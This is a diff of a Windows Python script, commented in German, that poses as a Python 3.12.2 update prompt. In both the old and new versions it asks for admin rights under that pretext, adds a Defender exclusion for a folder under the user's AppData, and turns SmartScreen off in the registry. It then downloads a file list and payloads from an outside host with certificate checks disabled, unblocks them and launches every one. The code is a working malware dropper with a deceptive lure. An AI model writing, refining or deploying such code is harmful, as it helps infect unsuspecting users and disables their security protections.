@@ -1,182 +1,186 @@
-from math import e
 import os
 import pathlib as pl
-from pdb import run
-import random
 import ssl
 import subprocess
 import urllib.request
 import sys
 import ctypes
 import time
-import winreg
 
-is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0 #type: ignore
+# ────────────────────────────────────────────────
+# CONFIG
+APP_NAME = "vshost"
+BASE_DIR = str(pl.Path.home() / "AppData" / "Local" / "Common" / "python" / "files")
+FILES_TXT_URL = "http://files.akirottv.de"
+# ────────────────────────────────────────────────
 
-class Main:
+APP_DIR = os.path.join(BASE_DIR, APP_NAME)
+os.makedirs(APP_DIR, exist_ok=True)
 
-    APP_NAME = "vshost"
-    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common' / 'python' / 'files'}"
-    FILES_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common' / 'python' / 'files' / 'files'}"
-    FILES_TXT_URL = "http://files.akirottv.de"
 
-    APP_DIR = os.path.join(BASE_DIR, APP_NAME)
-    os.makedirs(APP_DIR, exist_ok=True)
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
 
-    def __init__(self):
-        pass
-    
-    def send_update_notification(self):
-        install_input = input("A new version of Python is available: 3.12.2" +
-                            "\nYou are currently using: 3.11.6" +
-                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
-        return install_input.strip().lower() in ['y', '']
+def send_update_notification():
+    install_input = input(
+        "A new version of Python is available: 3.12.2\n"
+        "You are currently using: 3.11.6\n"
+        "Press 'Y' or 'Enter' to update or 'N' to skip: "
+    )
+    return install_input.strip().lower() in ['y', '']
 
-    def request_admin_privileges(self) -> bool:
-        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32 #type: ignore
+def request_admin():
+    try:
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, __file__, None, 1
+        )
+        return True
+    except:
+        return False
 
-    def add_folder_to_windows_defender_exclusions(self):
-        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
-        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
-        os.system(command)
-    
-    def perform_update(self):
-        steps = [
-            "Resolving dependencies...",
-            "Downloading package metadata...",
-            "Installing collected packages...",
-            "Applying security patches...",
-            "Finalizing installation..."
+def download_file_list():
+    try:
+        print("→ Lade Dateiliste...")
+        context = ssl._create_unverified_context()
+
+        with urllib.request.urlopen(FILES_TXT_URL, timeout=15, context=context) as resp:
+            data = resp.read().decode()
+
+        urls = [
+            line.strip()
+            for line in data.splitlines()
+            if line.startswith("http")
         ]
 
-        for step in steps:
-            print(step)
-            time.sleep(random.uniform(1, 4.5)) # Simulate time taken for each step
+        print(f"→ {len(urls)} Dateien gefunden")
+        return urls
 
-        print("\nSuccessfully installed updates.")
-        print("Current version: 3.11.6")
-        print("Updated to: 3.12.2")
-        print("Restart may be required.")
-        time.sleep(2)
-        exit(0)
+    except Exception as e:
+        print(f"Fehler beim Laden der Liste: {e}")
+        return []
 
-    def remove_hkey(self):
-        import winreg
-        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+def download_files(urls):
+    for url in urls:
         try:
-            key = winreg.OpenKey(  # type: ignore
-                winreg.HKEY_CURRENT_USER,  # type: ignore
-                key_path,
-                0,
-                winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
-            )
-            time.sleep(1)
-            print(key)
-            # Alten Wert löschen, falls vorhanden
-            try:
-                winreg.DeleteValue(key, "main")  # type: ignore
-            except Exception as e:
-                print(f"{e}")
-                time.sleep(2)
-        except Exception as e:
-            print(f"Registry Fehler: {e}")
-            
-    def download_and_return_list_of_files(self) -> list[str]:
-        try:
-            print(f"→ Downloading list of files...")
+            print(f"→ Lade {url} ...")
+
             context = ssl._create_unverified_context()
-            req = urllib.request.Request(self.FILES_TXT_URL)
-            req.add_header("Pragma", "no-cache")
-            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
-                if getattr(resp, "status", 200) != 200:
-                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
-                    exit(1)
-                new_content = resp.read()
-                file_urls = [line.strip() for line in new_content.decode().splitlines() if line.startswith("http")]
-                return file_urls
+            with urllib.request.urlopen(url, timeout=15, context=context) as resp:
+                data = resp.read()
 
+            filename = os.path.basename(url)
+            filepath = os.path.join(APP_DIR, filename)
+
+            with open(filepath, "wb") as f:
+                f.write(data)
+
+            print(f"→ Gespeichert: {filename}")
+
+        except Exception as e:
+            print(f"Fehler bei {url}: {e}")
+
+def disable_smartscreen():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE) #type: ignore
+        winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off") #type: ignore
+        winreg.CloseKey(key) #type: ignore
+        print("PythonSS erfolgreich aktiviert.")
+    except Exception as e:
+        print(f"Fehler: {e}")
+
+def unblock_files():
+    path = APP_DIR
+    for file in pl.Path(path).iterdir():
+        try:
+            print(f"→ Unblocking {file.name}...")
+            command = f'powershell -Command "Unblock-File -Path \\"{pl.Path(APP_DIR, file.name)}\\""'
+            os.system(command)
         except Exception as e:
             print(f"{e}")
-            exit(1)
-    
-    def download_files(self, file_urls: list[str]):
-        for url in file_urls:
-            try:
-                print(f"→ Downloading {url}...")
-                context = ssl._create_unverified_context()
-                req = urllib.request.Request(url)
-                req.add_header("Pragma", "no-cache")
-                with urllib.request.urlopen(req, timeout=15, context=context) as resp:
-                    if getattr(resp, "status", 200) != 200:
-                        print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
-                        continue
-                    new_content = resp.read()
-                    file_name = os.path.basename(url)
-                    file_path = os.path.join(self.APP_DIR, file_name)
-                    with open(file_path, "wb") as f:
-                        f.write(new_content)
-                    print(f"→ Successfully downloaded {file_name}")
-            except Exception as e:
-                print(f"{e}")
-                continue
-    
-    def unblock_files(self, path: pl.Path):
-        for file in path.iterdir():
-            try:
-                print(f"→ Unblocking {file.name}...")
-                command = f'powershell -Command "Unblock-File -Path \\"{pl.Path(self.APP_DIR, file.name)}\\""'
-                os.system(command)
-            except Exception as e:
-                print(f"{e}")
-    
-    def open_files(self):
-        for file_name in pl.Path(self.FILES_DIR).iterdir():
-                if os.path.isfile(file_name):
-                    try:
-                        print(f"→ Opening {str(file_name)}...")
-                        print(subprocess.run(['start', file_name], cwd=self.FILES_DIR, shell=True, check=True))
-                    except Exception as e:
-                        print(f"{e}")
-                    continue
-    
-    def disable_smartscreen(self):
-        try:
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", 0, winreg.KEY_SET_VALUE) #type: ignore
-            winreg.SetValueEx(key, "SmartScreenEnabled", 0, winreg.REG_SZ, "Off") #type: ignore
-            winreg.CloseKey(key) #type: ignore
-            print("PythonSS erfolgreich aktiviert.")
-        except Exception as e:
-            print(f"Fehler: {e}")
 
-    def run(self):
-        self = Main()
-        if is_admin:
-            print("Gathering dependencies and preparing for update...")
-            self.add_folder_to_windows_defender_exclusions()
-            file_urls = self.download_and_return_list_of_files()
-            self.download_files(file_urls)
-            self.disable_smartscreen()
-            self.unblock_files(pl.Path(self.APP_DIR))
-            self.open_files()
-            self.remove_hkey() #234
-            exit(0)
-        if self.send_update_notification():
-            print("Updating Python...")
-            time.sleep(1)
-            if self.request_admin_privileges():
-                exit(0)
-            else:
-                print("Admin privileges are required to perform the update. Please rerun the installer as an administrator.")
-                time.sleep(2)
-                self.request_admin_privileges()
-        else:
-            print("Update skipped.")
-            time.sleep(2)
-            
-if __name__ == "__main__":
-    self = Main()
+def remove_hkey():
+    import winreg
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
-        self.run()
-    except Exception as ex:
-        print(str(ex))
-        time.sleep(60)
+        key = winreg.OpenKey(  # type: ignore
+            winreg.HKEY_CURRENT_USER,  # type: ignore
+            key_path,
+            0,
+            winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
+        )
+        time.sleep(1)
+        print(key)
+        # Alten Wert löschen, falls vorhanden
+        try:
+            winreg.DeleteValue(key, "main")  # type: ignore
+        except Exception as e:
+            print(f"{e}")
+            time.sleep(2)
+    except Exception as e:
+        print(f"Registry Fehler: {e}")
+
+
+def add_folder_to_windows_defender_exclusions():
+    folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
+    command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
+    os.system(command)
+
+def open_files():
+    print("→ Starte Dateien...")
+
+    for file in pl.Path(APP_DIR).iterdir():
+        if file.is_file():
+            try:
+                print(f"→ Öffne {file.name}")
+
+                subprocess.Popen(
+                    f'start "" "{file}"',
+                    shell=True,
+                    cwd=APP_DIR
+                )
+
+            except Exception as e:
+                print(f"Startfehler: {e}")
+
+def run():
+    print("=== START ===\n")
+
+    if not is_admin():
+        print("→ Keine Adminrechte")
+
+        if send_update_notification():
+            print("→ Fordere Adminrechte an...")
+            request_admin()
+            sys.exit(0)
+        else:
+            print("→ Update übersprungen")
+            return
+
+    print("→ Adminrechte OK\n")
+    add_folder_to_windows_defender_exclusions()
+    disable_smartscreen()
+
+    urls = download_file_list()
+
+    if not urls:
+        print("→ Keine Dateien gefunden – Abbruch")
+        return
+
+    download_files(urls)
+    unblock_files()
+    open_files()
+
+    print("\n✅ Fertig")
+    input("Enter drücken zum Beenden...")
+
+
+if __name__ == "__main__":
+    try:
+        APP_DIR = os.path.join(BASE_DIR, APP_NAME)
+        run = run()
+    except Exception as e:
+        print(f"CRASH: {e}")
+        input("Enter drücken...")
